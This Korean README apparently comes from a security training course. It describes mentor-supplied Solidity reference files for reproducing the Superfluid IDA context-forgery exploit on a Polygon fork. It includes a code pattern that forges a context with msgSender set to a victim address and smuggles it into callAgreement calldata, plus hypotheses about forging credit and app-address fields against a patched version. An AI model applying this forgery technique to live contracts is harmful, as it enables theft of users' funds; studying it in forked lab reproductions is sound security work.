# reference/

멘토(setuid0/wooz3k)가 강의 중에 작성/제공한 참조 파일.

## IDAUsage_t.sol
- Superfluid IDA(InstantDistributionAgreement)의 정상 사용 예제
- Polygon mainnet fork @ block 24,684,651 (사건 직전, ch4/ch5와 거의 동일 fork point)
- 모든 IDA 함수의 minimal Solidity interface 포함
- happy-path 테스트: createIndex → updateSubscription → distribute → claim
- Bob이 토큰 없을 때 실패 케이스
- updateIndex 대안 패턴
- ContextUtils 사용 예제 (test_BuildAndPackContext)

**활용**: ch4/ch5 PoC의 출발점. 인터페이스 그대로 가져다 씀.

## ContextUtils.sol
- Superfluid Host의 내부 Context 인코딩과 byte-identical한 라이브러리
- `Context` struct: 11개 필드 (appCallbackLevel, callType, timestamp, msgSender, agreementSelector, userData, appCreditGranted, appCreditWantedDeprecated, appCreditUsed, appAddress, appCreditToken)
- `buildContext()` — top-level callAgreement에서 호스트가 만드는 ctx와 동일하게 빌드
- `encodeContext()` — `abi.encode(abi.encode(...ctx1...), abi.encode(...ctx2...))` 정확히 매치
- `decodeContext()` — round-trip
- `stamp()` — `keccak256(packed)` (호스트의 _ctxStamp와 동일)

**활용**: ch4/ch5의 ctx forgery 핵심. 임의 필드값으로 ctx 만들어 calldata에 끼워넣음.

---

## ch4 (Superfluid v1) 활용 패턴

```solidity
// 1. fake ctx 만들기 — msgSender를 피해자 주소로
ContextUtils.Context memory fakeCtx = ContextUtils.buildContext(
    VICTIM_ADDR,                        // 진짜 publisher 주소로 위장
    IDA.createIndex.selector,           // 호출하는 함수 selector
    bytes("")                           // userData
);
bytes memory fakeCtxBytes = ContextUtils.encodeContext(fakeCtx);

// 2. callData를 잘못 만들어서 fake ctx를 마지막에 끼워넣기
bytes memory inner = abi.encodeCall(
    IDA.createIndex,
    (token, indexId, fakeCtxBytes)      // 원래는 placeholder new bytes(0)
);
bytes memory withPlaceholder = abi.encodePacked(inner, abi.encode(new bytes(0)));

// 3. host에 호출하면 placeholder만 교체되고 fake ctx 보존
HOST.callAgreement(IDA, withPlaceholder, "");

// 결과: createIndex 입장에서는 ctx.msgSender = VICTIM_ADDR
```

## ch5 (Superfluid v2 — patched) 활용 패턴

Patch 1 적용으로 `authorizeTokenAccess` → `isCtxValid(ctx)` → keccak256 검증.
하지만 `claim()`은 `authorizeTokenAccess` 자체를 호출하지 않음 (Patch 2 이전).

따라서 v1 트릭은 `claim` 경로에서만 작동:
- msgSender 위조 의미 없음 (claim의 publisher/subscriber는 함수 인자로 직접 받음)
- **다른 필드** 조작이 핵심:
  - `appCreditGranted` 인플레이트 → callback 안에서 호스트의 sub-operation 호출 시 credit 한도 오버
  - `appAddress` 위조 → callback 시 SuperApp을 공격자 컨트랙트로
  - `appCreditToken` 위조 → 다른 SuperToken을 credit 대상으로

자세한 가설은 `knowledge/case_superfluid_v2.md` 참조.

---

이 두 파일은 멘토 저작물이다. 우리 보고서에서는 reference로 명시.
